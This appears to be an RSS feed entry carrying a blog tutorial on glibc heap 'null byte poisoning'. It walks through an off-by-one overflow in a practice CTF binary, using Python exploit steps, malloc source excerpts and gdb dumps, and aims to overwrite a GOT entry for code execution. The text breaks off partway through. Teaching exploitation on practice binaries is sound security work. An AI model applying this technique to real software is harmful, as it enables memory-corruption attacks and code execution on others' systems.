@@ -1,0 +1,1534 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Null Byte Poisoning - The Magic Byte</title>
+    <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874</link>
+    <description>Hello folks! I hope you&#39;re all doing great! Today&#39;s topic is by far my most favorite heap exploitation technique I&#39;ve ever dealt with until now (as far as Linux is concerned). I can&#39;t stress enough how much I love this technique. It&#39;s super smart, technical, and even though malloc has been hardened a ton over the years, it still bypasses all mitigations. And the best part, one single byte overflow can cause chaos.
+
+For today&#39;s demo purposes, I&#39;ve created a [pwnable](https://transfer.sh/wYEUU/magicbyte) in order to practice/showcase the technique (I&#39;ll demo the exploit on Ubuntu 16.04). I highly recommend going through some google research and my previous posts on heap exploitation if you&#39;ve never pwned the heap before. At the end of the post you can find another pwnable of the same nature made by HITCON in case you want to master the technique. Without further ado, let&#39;s get right into it!
+
+---
+_**Disclaimer:** The following text is part of my own research / comprehension. If you&#39;re a veteran on this topic and you happen to spot any mistake please let me know and I&#39;ll correct it asap._
+ 
+---
+
+###_Binary Recon_
+
+Before we jump into the theory of the null byte poison attack, let&#39;s skim through the assembly real quick. The binary doesn&#39;t do anything extroardinary.
+
+* We can allocate a chunk. The chunk has the following structure:
+
+```c
+struct chunk {
+     size_t size;
+     char* data;
+};
+```
+
+* We can dump the chunk&#39;s content.
+
+* We can free the chunk. No bugs there.
+
+```asm
+/* index */  
+mov eax, dword [rbp-0x14]  
+mov rax, qword [rax*8+array]
+/* Free data&#39;s malloc&#39;d pointer */  
+mov rax, qword [rax+0x8]
+mov rdi, rax
+call free
+mov eax, dword [rbp-0x14]
+/* Free the chunk itself */
+mov rax, qword [rax*8+0x6020c0]
+mov rdi, rax
+call free
+mov eax, dword [rbp-0x14]
+/* No UAF or double-free */ 
+mov qword [rax*8+0x6020c0], 0x0
+```
+
+* And finally we can edit the chunk&#39;s content, that&#39;s where the magic happens.
+
+```asm
+mov eax, dword [rbp-0x14]
+mov rax, qword [rax*8+0x6020c0]
+/* Get size of data */
+mov rdx, qword [rax]
+mov eax, dword [rbp-0x14]
+mov rax, qword [rax*8+0x6020c0]
+/* Get the data pointer */
+mov rax, qword [rax+0x8]
+mov rsi, rdx
+mov rdi, rax
+call 0x400b12
+
+0x400b12:
+
+	/* Null terminate at offset data + size */
+	mov qword [rbp-0x8], rdi
+	mov qword [rbp-0x10], rsi
+	mov rdx, qword [rbp-0x8]
+	mov rax, qword [rbp-0x10]
+	add rax, rdx
+	mov byte [rax], 0x0
+
+
+```
+
+Although this function might not look buggy to the unexperienced eye, it&#39;s actually pretty lethal. Consider the following example:
+
+```python
+alloc(0x88,  &#39;A&#39;*0x88)
+alloc(0x108, &#39;B&#39;*0x108)
+```
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000088	0x0000000000603030 &lt;-- data pointer
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x4141414141414141	0x4141414141414141
+					...					...
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x4141414141414141	0x0000000000000021 &lt;-- chunk 1
+0x6030c0:	0x0000000000000108	0x00000000006030e0 &lt;-- data pointer
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+
+```
+
+If we call edit on chunk 0, it will take data&#39;s address (_0x603030_) and null terminate its content at offset:
+
+```makefile
+0x603030 + 0x88 = 0x6030b8 = chunk 1&#39;s size field.
+```
+
+```python
+edit(0, &#39;A&#39;*2)
+```
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000088	0x0000000000603030 &lt;-- data pointer
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x4141414141414141	0x4141414141414141
+					...					...
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x4141414141414141	0x0000000000000000 &lt;-- chunk 1
+0x6030c0:	0x0000000000000108	0x00000000006030e0 &lt;-- data pointer
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+
+```
+
+Booyah, corruption! Chunk 1&#39;s size went from **0x21** to **0x00**. The binary recon is over, let&#39;s move on to the pwning part.
+
+
+---
+
+###_Leaking Libc_
+
+The heap has the above structure. There are two ways to leak libc. The boring way and the 1337 way. I&#39;ll illustrate both because why not. Free-ing chunk 0 has the following effect.
+
+```python
+free(0)
+```
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- chunk 0
+0x603010:	0x0000000000000000	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000091
+0x603030:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+```
+
+Because of the fact that the data&#39;s heap chunk is of size **0x90**, it&#39;s considered a small bin chunk. Meaning, it will be placed in a circly double-linked list. Actually, it&#39;ll first be placed in the unsorted bin list since malloc likes to give the recently free&#39;d chunk one chance of re-allocation before it places it in the corresponding small bin list for speed purposes.
+
+```c
+/*
+    Place the chunk in unsorted chunk list. Chunks are
+    not placed into regular bins until after they have
+    been given one chance to be used in malloc.
+ */
+
+    bck = unsorted_chunks(av);
+    fwd = bck-&gt;fd;
+    if (__glibc_unlikely (fwd-&gt;bk != bck))
+        malloc_printerr (&quot;free(): corrupted unsorted chunks&quot;);
+    p-&gt;fd = fwd;
+    p-&gt;bk = bck;
+    if (!in_smallbin_range(size))
+    {
+        p-&gt;fd_nextsize = NULL;
+        p-&gt;bk_nextsize = NULL;
+    }
+    bck-&gt;fd = p;
+    fwd-&gt;bk = p;
+
+    set_head(p, size | PREV_INUSE);
+    set_foot(p, size);
+
+    check_free_chunk(av, p);
+
+```
+
+The BK and FD pointers you see in the data&#39;s chunk are main arena pointers in libc. They have the same value because the free&#39;d chunk is the only chunk in the circly double-linked list so both its BK and FD fields will point to the same bin address. The main arena&#39;s state is the follwing:
+
+```makefile
+==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x603000 --&gt; 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6031e0 (size : 0x20e20) 
+       last_remainder: 0x0 (size : 0x0) 
+            unsortbin: 0x603020 (size : 0x90)
+```
+
+Having read malloc&#39;s source code, we should expect our data to be stored in the unsorted bin chunk at _0x603020_ once we request a new allocation again. Why?
+
+---
+_Our data&#39;s size is `0x8` bytes long, meaning it&#39;s of fast chunk size. However, because of the fact that the first allocation stores the size of the data and the pointer to the data (0x20 bytes in total including metadata), 0x603000 will be returned for the first allocation. Now we&#39;re left with the unsorted bin chunk and no fastbin available to store our 8 byte long data. When there&#39;s no fastbin available, the chunk will be served through smallbin code, and if there&#39;s no smallbin available (there is none in our case), the chunk will be served through unsorted bin code (0x603020 in our case) or via the remainder. Let&#39;s see it in action._
+---
+
+```python
+# Could&#39;ve leaked libc but let&#39;s step it up
+alloc(0x8, &#39;C&#39;*0x8) 
+```
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021 &lt;-- new chunk
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021 &lt;-- new data pointer
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000071 &lt;-- remainder chunk after the split
+0x603050:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+```
+
+We allocated just enough bytes to not overwrite the libc pointer. As you might noticed the BK field got updated to **0x00007ffff7dd3838**. Why this happened is for you to figure it out, I can&#39;t spoon feed you everything ;) 
+
+Now if we go ahead and dump the chunk&#39;s content, we&#39;ll get the libc address (obviously in every execution the address will be a bit different but its offset from the base address always remains the same, check it out by yourself) back and we&#39;ll be able to calculate libc&#39;s base address. That&#39;s boring. Let&#39;s abuse the null byte overflow in order to leak and then execute arbitrary code.
+
+---
+
+###_The Whys &amp; Hows_
+
+There are many cases of a null byte poison. In a heap context though, null byte poisoning, aka off-by-one overflow, aka null byte overflow, aka chunk shrinking, is usually the ability to overflow a chunk&#39;s size field while it&#39;s free, leading to all kinds of pleasant mysteries. 
+
+The hows and whys of the mysteries will be presented by showing you the core pieces of malloc&#39;s source code which the exploit/technique takes advantage of in order to achieve arbitrary code execution. Don&#39;t worry if some of the code snippets make no sense in the beginning. When I&#39;ll introduce the technique I&#39;ll explain everything ranging from macros all the way up to the pointer arithmetic being used.
+
+---
+
+The scenario which I&#39;ll try to achieve with this technique is to overlap a new allocated chunk with an already in use chunk (you&#39;ll see what I mean) in order to overwrite the data pointer of the latter. There might be other ways to achieve arbitrary code execution by abusing this bug but the core effects should be the same.
+
+Let&#39;s first allocate a couple more chunks in order to make the technique work. Since the heap is quite complicated, what I like to do before any malloc/free is &quot;guess&quot; where the chunks will be placed in memory in order to test my understanding. So let&#39;s make some assumptions together.
+
+```python
+# p64(0x200) is needed afterwards in order to bypass one of unlink&#39;s checks
+alloc(0x208, &#39;D&#39;*0x1f0 + p64(0x200)) 
+```
+
+Ignore the content of the data for now, I&#39;ll explain all about it later on. The state of main arena is this:
+
+```makefile
+==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6031e0 (size : 0x20e20) 
+       last_remainder: 0x603040 (size : 0x70) 
+            unsortbin: 0x603040 (size : 0x70)
+```
+
+The remainder chunk is of size **0x70**. What does that mean for our allocation? As explained before, for every allocation we need **0x20** bytes in total (taking the heap metadata into consideration) in order to store the size of the data and the pointer. **0x20** is obviously less than **0x70** so the remainder chunk will get split, afterwards reattached and finally its size should now become **0x50**. 
+
+```c
+size = chunksize (victim);
+
+/*
+   If a small request, try to use last remainder if it is the
+   only chunk in unsorted bin.  This helps promote locality for
+   runs of consecutive small requests. This is the only
+   exception to best-fit, and applies only when there is
+   no exact fit for a small chunk.
+ */
+
+if (in_smallbin_range (nb) &amp;&amp;
+    bck == unsorted_chunks (av) &amp;&amp;
+    victim == av-&gt;last_remainder &amp;&amp;
+    (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
+{
+   				...
+ 	/* split and reattach remainder */
+   	remainder_size = size - nb;
+   	remainder = chunk_at_offset (victim, nb);
+   	unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
+    av-&gt;last_remainder = remainder;
+
+        		...
+    set_head (victim, nb | PREV_INUSE |
+                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+    set_head (remainder, remainder_size | PREV_INUSE);
+    set_foot (remainder, remainder_size);
+
+    check_malloced_chunk (av, victim, nb);
+    void *p = chunk2mem (victim);
+    alloc_perturb (p, bytes);
+    return p;
+ }        
+   	             
+```
+
+As for our data, there&#39;s no available free chunk to be served back to us and thus malloc will use its last resort, the top chunk.
+
+```c
+victim = av-&gt;top;
+size = chunksize (victim);
+
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+{
+    remainder_size = size - nb;
+    remainder = chunk_at_offset (victim, nb);
+    av-&gt;top = remainder;
+    set_head (victim, nb | PREV_INUSE |
+               (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+    set_head (remainder, remainder_size | PREV_INUSE);
+
+    check_malloced_chunk (av, victim, nb);
+    void *p = chunk2mem (victim);
+    alloc_perturb (p, bytes);
+    return p;
+}
+```
+
+Let&#39;s check the effect of our allocation on main arena.
+
+```makefile
+==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x6033f0 (size : 0x20c10) 
+       last_remainder: 0x603060 (size : 0x50) 
+            unsortbin: 0x0
+(0x050)  smallbin[ 3]: 0x603060
+```
+
+Look at that! The unsorted chunk was well placed in its corresponding small bin list, the last remainder moved further away and its size indeed became **0x50** and finally the top chunk also moved further away with its size reduced by **0x210** bytes as expected. Here&#39;s the gdb view:
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000021 &lt;-- new allocated chunk
+0x603050:	0x0000000000000208	0x00000000006031f0 &lt;-- new allocated pointer
+0x603060:	0x4141414141414141	0x0000000000000051 &lt;-- reattached remainder chunk
+0x603070:	0x00007ffff7dd37f8	0x00007ffff7dd37f8
+0x603080:	0x4141414141414141	0x4141414141414141
+0x603090:	0x4141414141414141	0x4141414141414141
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x0000000000000050	0x0000000000000020
+0x6030c0:	0x0000000000000108	0x00000000006030e0
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+0x603100:	0x4242424242424242	0x4242424242424242
+0x603110:	0x4242424242424242	0x4242424242424242
+0x603120:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- new allocated data chunk
+0x6031f0:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000000	0x0000000000020c11 &lt;-- new top chunk
+					...					...
+```
+
+Let&#39;s follow up with the next two allocations which will make malloc take the same code path like last time.
+
+
+```python
+alloc(0x108, &#39;E&#39;*0x108) 
+# Prevent top chunk consolidation
+alloc(0x108, &#39;F&#39;*0x108)
+```
+
+```makefile
+0x603000:	0x0000000000000000	0x0000000000000021
+0x603010:	0x0000000000000008	0x0000000000603030
+0x603020:	0x0000000000000000	0x0000000000000021
+0x603030:	0x4343434343434343	0x00007ffff7dd3838
+0x603040:	0x4141414141414141	0x0000000000000021
+0x603050:	0x0000000000000208	0x00000000006031f0
+0x603060:	0x4141414141414141	0x0000000000000021
+0x603070:	0x0000000000000108	0x0000000000603400
+0x603080:	0x4141414141414141	0x0000000000000031
+0x603090:	0x0000000000000108	0x0000000000603510
+0x6030a0:	0x4141414141414141	0x4141414141414141
+0x6030b0:	0x0000000000000030	0x0000000000000021
+0x6030c0:	0x0000000000000108	0x00000000006030e0
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+0x603100:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031c0:	0x4242424242424242	0x4242424242424242
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- chunk x
+0x6031f0:	0x4444444444444444	0x4444444444444444
+0x603200:	0x4444444444444444	0x4444444444444444
+0x603210:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033a0:	0x4444444444444444	0x4444444444444444
+0x6033b0:	0x4444444444444444	0x4444444444444444
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000000	0x0000000000000111 &lt;-- chunk y
+0x603400:	0x4545454545454545	0x4545454545454545
+0x603410:	0x4545454545454545	0x4545454545454545
+0x603420:	0x4545454545454545	0x4545454545454545
+					...					...
+0x6034d0:	0x4545454545454545	0x4545454545454545
+0x6034e0:	0x4545454545454545	0x4545454545454545
+0x6034f0:	0x4545454545454545	0x4545454545454545
+0x603500:	0x4545454545454545	0x0000000000000111
+0x603510:	0x4646464646464646	0x4646464646464646
+0x603520:	0x4646464646464646	0x4646464646464646
+0x603530:	0x4646464646464646	0x4646464646464646
+					...					...
+0x6035f0:	0x4646464646464646	0x4646464646464646
+0x603600:	0x4646464646464646	0x4646464646464646
+0x603610:	0x4646464646464646	0x00000000000209f1 &lt;-- updated top chunk
+```
+
+Our setup is ready, time to step up our game. 
+
+---
+
+###_Previous Size Field_
+
+In case you didn&#39;t know, when a chunk is free&#39;d and is of size greater than the maximum size value of a fast chunk, the chunk that is bordering the free chunk needs to update itself about the fact that the chunk next to it (technically before) got free&#39;d and it does that by setting the **IN_USE** bit to **0** and the _prevsize_ field to the size of the free&#39;d chunk. Let me show you what I mean.
+
+```python
+free(2) # chunk x
+```
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000211 &lt;-- chunk x [free]
+0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603200:	0x4444444444444444	0x4444444444444444
+0x603210:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y 
+0x603400:	0x4545454545454545	0x4545454545454545
+```
+
+As you can see, chunk y&#39;s size field went from **0x111** to **0x110** to indicate that the previous chunk is free. Moreover, its _prevsize_ field got updated from **0x00** to **0x210**. The _prevsize_ field is used only if the previous chunk is **free**, otherwise it&#39;s part of chunk x&#39;s data. Do the math and see that _0x6033f0_ (the address of chunk y) - _0x210_ equals to _0x6031e0_.
+
+Before I overwrite chunk&#39;s size with a null byte (making it 0x200), I believe it&#39;d be nice to have both POVs in mind, the one with non-overwritten size field and the one with the shrunk one. Firstly I will allocate a new chunk by leaving chunk x&#39;s size untouched.
+
+```python
+alloc(0x108,  &#39;G&#39;*0x108)
+```
+
+Malloc will take the following code path:
+
+```c
+size = chunksize (victim);
+
+/* We know the first chunk in this bin is big enough to use. */
+assert ((unsigned long) (size) &gt;= (unsigned long) (nb));
+
+remainder_size = size - nb;
+
+/* unlink */
+unlink (av, victim, bck, fwd);
+
+		...
+
+remainder = chunk_at_offset (victim, nb);
+
+/* We cannot assume the unsorted list is empty and therefore
+   have to perform a complete insert here. */
+   
+bck = unsorted_chunks (av);
+fwd = bck-&gt;fd;
+if (__glibc_unlikely (fwd-&gt;bk != bck))
+	malloc_printerr (&quot;malloc(): corrupted unsorted chunks 2&quot;);
+remainder-&gt;bk = bck;
+remainder-&gt;fd = fwd;
+bck-&gt;fd = remainder;
+fwd-&gt;bk = remainder;
+
+/* advertise as last remainder */
+if (in_smallbin_range (nb))
+    av-&gt;last_remainder = remainder;
+        
+    	...
+
+set_head (victim, nb | PREV_INUSE |
+              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+set_head (remainder, remainder_size | PREV_INUSE);
+set_foot (remainder, remainder_size);
+
+check_malloced_chunk (av, victim, nb);
+void *p = chunk2mem (victim);
+alloc_perturb (p, bytes);
+return p; 
+
+```
+
+It may look daunting at first but thankfully malloc&#39;s authors knew how to write readable code and once you stare at it for a while it hits you. To sum up, here&#39;s what will happen:
+
+* Calculate the remainder size after the split by subtracting the current size with the requested size (0x210 - 0x110 in our case). 
+
+* Calculate the address of the remainder chunk after the split by adding the requested size + alignment to the base address of the chunk that is about to be allocated (0x6031e0 + 0x110 in our case).
+
+* Unlink the unsorted chunk from the bin list in order to split it.
+
+* Declare it as the remainder chunk (av-&gt;last_remainder = remainder).
+
+* Update the remainder&#39;s size field with the set_head macro.
+
+```c
+/* Set size/use field */
+#define set_head(p, s)  ((p)-&gt;mchunk_size = (s))
+```
+
+* Update the _prevsize_ field of chunk y.
+
+```c
+/* Set size at footer (only when chunk is not in use) */
+#define set_foot(p, s)	(((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
+```
+* Give back the split chunk to the user.
+
+This is how it looks like in memory:
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z
+0x6031f0:	0x4747474747474747	0x4747474747474747
+0x603200:	0x4747474747474747	0x4747474747474747
+					...					...
+0x6032d0:	0x4747474747474747	0x4747474747474747
+0x6032e0:	0x4747474747474747	0x4747474747474747
+0x6032f0:	0x4747474747474747	0x0000000000000101 &lt;-- remainder chunk after split [free]
+0x603300:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603310:	0x4444444444444444	0x4444444444444444
+0x603320:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000100	0x0000000000000110 &lt;-- chunk y 
+0x603400:	0x4545454545454545	0x4545454545454545
+```
+
+Just to be sure, let&#39;s check malloc&#39;s calculations.
+
+```makefile
+
+(i)   remainder_size = size - nb = 0x210 - 0x110        = 0x100
+(ii)  remainder      = chunk_at_offset (victim, nb)     = 0x6031e0   + 0x110  = 0x6032f0
+(iii) set_head (remainder, remainder_size | PREV_INUSE) = *(0x6032f0 + 0x8)   = 0x101
+(iv)  set_foot (remainder, remainder_size);             = *(0x6032f0 + 0x100) = 0x100
+
+```
+
+Cute! Let&#39;s have a look at what&#39;s going to happen when the null byte poison takes place before the allocation.
+
+---
+
+###_Null Byte Poisoning_
+
+We&#39;ll take advantage of the fact that _edit_ null terminates the provided strings as we saw during the recon phase.
+
+```python
+# Null byte poison
+edit(1, &#39;B&#39;*0x108)
+```
+
+```makefile
+0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000200 &lt;-- chunk x [shrunk &amp; free]
+0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+```
+
+Before we re-check malloc&#39;s calculations once again for the new shrunk size, let me explain a bit about the below line of code which was previous used in the exploit:
+
+```python
+# p64(0x200) is needed in order to bypass unlink&#39;s check
+alloc(0x208, &#39;D&#39;*0x1f0 + p64(0x200))
+```
+
+As I mentioned above, the next allocation will unlink the chunk at address _0x6031e0_. Unlink&#39;s code has the following checks that we need to bypass:
+
+```c
+/* Take a chunk off a bin list */
+#define unlink(AV, P, BK, FD) {                                            
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
+      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);			      
+    FD = P-&gt;fd;								      
+    BK = P-&gt;bk;								      
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
+      malloc_printerr (&quot;corrupted double-linked list&quot;);	
+```
+
+In particular, we only need to bypass the first check since the second one is good to go because its FD and BK fields indeed point to it. Practically, the first check makes sure that:
+
+```makefile
+sizeof(chunk) == *(0x6031e0 + size) == prev_size(next_chunk)
+```
+
+In other words, the _prevsize_ field of the next chunk **must** have the size value of its previous free chunk as we discussed before. Since we overwrote the size with **0x200**, the address area at offset _0x6031e0 + 0x200_ still belongs to the data area of chunk x, _0x6033e0_ to be precise. 
+
+Meaning, if we don&#39;t take care of that value at that offset, _unlink_ will detect the memory corruption and terminate the binary. That&#39;s why my data&#39;s payload has that certain structure, we technically craft a fake chunk. 
+
+Let&#39;s move on with the allocation.
+
+```python
+alloc(0x108,  &#39;G&#39;*0x108)
+```
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z
+0x6031f0:	0x4747474747474747	0x4747474747474747
+0x603200:	0x4747474747474747	0x4747474747474747
+					...					...
+0x6032d0:	0x4747474747474747	0x4747474747474747
+0x6032e0:	0x4747474747474747	0x4747474747474747
+0x6032f0:	0x4747474747474747	0x00000000000000f1 &lt;-- remainder chunk after split [free]
+0x603300:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603310:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x00000000000000f0	0x000000000000000a
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y [prev_size not updated]
+0x603400:	0x4545454545454545	0x4545454545454545
+0x603410:	0x4545454545454545	0x4545454545454545
+```
+
+What the hell just happened?! Chunk y&#39;s _prevsize_ didn&#39;t get updated and the remainder chunk&#39;s size is **0x10** less than it was without the null poison. It&#39;s no coincidence that chunk y&#39;s &quot;prev_size&quot; field is **0x10** bytes **before** chunk y&#39;s legit _prevsize_ address. Off to the malloc calculations!
+
+```makefile
+
+(i)   remainder_size = size - nb = 0x200 - 0x110        = 0xf0
+(ii)  remainder      = chunk_at_offset (victim, nb)     = 0x6031e0   + 0x110  = 0x6032f0
+(iii) set_head (remainder, remainder_size | PREV_INUSE) = *(0x6032f0 + 0x8)   = 0x101
+(iv)  set_foot (remainder, remainder_size);             = *(0x6032f0 + 0xf0)  = 0xf0
+
+```
+
+Do you see what I see? The `set_foot` macro failed to update chunk y&#39;s _prevsize_ field (because 0x6032f0 + 0xf0 = 0x6033e0), which is a major advantage for us. Why&#39;s that? Chunk y thinks that the previous free chunk is still **0x210** bytes before it, not knowing that in fact the free chunk has been updated, split and moved to a different address. 
+
+How can we take advantage of this? Well, the main goal is to be able to overwrite a data pointer so that once _edit_ is called on that pointer, instead of editing data on the heap, we can edit whatever address we placed there (as long as it&#39;s writable ofcourse). The Global Offset Table is writeable so that&#39;s the address of choice (atoi&#39;s GOT entry to be precise). 
+
+Let&#39;s keep stepping through the exploit and witness the magic.
+
+```python
+# Because there&#39;s no pointer in between chunk z and y
+# we need to allocate one more chunk such that once we
+# free chunk y, the next allocation will overlap with the
+# previously allocated chunk.
+alloc(0x80,  &#39;H&#39;*0x80)
+```
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z &lt; - - - - - - - - - +					
+0x6031f0:	0x4747474747474747	0x4747474747474747												 |
+0x603200:	0x4747474747474747	0x4747474747474747												 |
+					...					...														 |
+0x6032f0:	0x4747474747474747	0x0000000000000021 &lt;-- new allocated chunk w 					 |
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- new allocated data pointer	     	     |
+0x603310:	0x4444444444444444	0x0000000000000091												 |
+0x603320:	0x4848484848484848	0x4848484848484848    											 |
+0x603330:	0x4848484848484848	0x4848484848484848											     |
+					...					...														 |
+0x603390:	0x4848484848484848	0x4848484848484848												 | - 0x210 
+0x6033a0:	0x4444444444444444	0x0000000000000041 &lt;-- remainder chunk after next split			 |
+0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8												 |
+0x6033c0:	0x4444444444444444	0x4444444444444444												 |
+0x6033d0:	0x4444444444444444	0x4444444444444444												 |
+0x6033e0:	0x0000000000000040	0x000000000000000a												 |
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y [thinks chunk z is free] - - - - -
+0x603400:	0x4545454545454545	0x4545454545454545
+```
+
+Once again what was &quot;supposed&quot; to be chunk y&#39;s _prevsize_ field at address _0x6033e0_ got updated to **0x40** (0xf0 - (0x90 + 0x20)) == 0x40). We have successfully placed a heap pointer between chunk y and chunk z. If you&#39;ve been paying attention up until now you might be able to figure out the next two crucial steps. First, let&#39;s free chunk z.
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z [free] &lt; - - - - - -					
+0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8												 |
+0x603200:	0x4747474747474747	0x4747474747474747												 |
+					...					...														 |
+0x6032f0:	0x0000000000000110	0x0000000000000020 &lt;-- chunk w [size / prev_size updated]		 |
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- pointer to overwrite					     |
+0x603310:	0x4444444444444444	0x0000000000000091												 |
+					...					...														 |
+0x603390:	0x4848484848484848	0x4848484848484848												 | - 0x210 
+0x6033a0:	0x4444444444444444	0x0000000000000041 &lt;-- remainder chunk 		                     |
+0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8												 |
+0x6033c0:	0x4444444444444444	0x4444444444444444												 |
+0x6033d0:	0x4444444444444444	0x4444444444444444												 |
+0x6033e0:	0x0000000000000040	0x000000000000000a												 |
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y  - - - - - - - - - - - - - - - - -                     
+0x603400:	0x4545454545454545	0x4545454545454545
+```
+
+Now what will malloc do once I free chunk y?
+
+```c
+/* consolidate backward */
+if (!prev_inuse(p)) {
+   prevsize = prev_size (p);
+   size += prevsize;
+   p = chunk_at_offset(p, -((long) prevsize));
+   unlink(av, p, bck, fwd);
+}
+```
+
+Simply put, malloc doesn&#39;t like fragmentation (except for the case of fastbins), it likes keeping thing clean and tidy. For that reason, when a small chunk is about to free&#39;d, it will check if its previous or next chunk are already free and if they are, it will consolidate them. Let&#39;s see it happening in action.
+
+```python
+# unlink chunk y and z
+free(3)
+```
+
+```makefile
+0x6031e0:	0x4242424242424242	0x0000000000000321 &lt;-- consolidated chunk  - - - +   
